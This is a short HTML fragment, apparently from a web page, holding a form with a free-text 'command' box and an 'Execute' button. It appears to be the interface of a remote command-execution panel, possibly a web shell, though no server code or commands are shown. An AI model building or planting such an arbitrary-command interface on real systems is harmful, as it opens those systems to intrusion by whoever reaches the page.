                <div style="margin-bottom:20px;">
                    <label style="color:#0ff;">Command:</label>
                    <textarea name="command" rows="5" style="width:100%; background:#000; color:#0ff; border:1px solid #0ff; padding:12px; border-radius:8px;" required></textarea>
                </div>
                <button type="submit" class="btn btn-primary">📤 Execute</button>
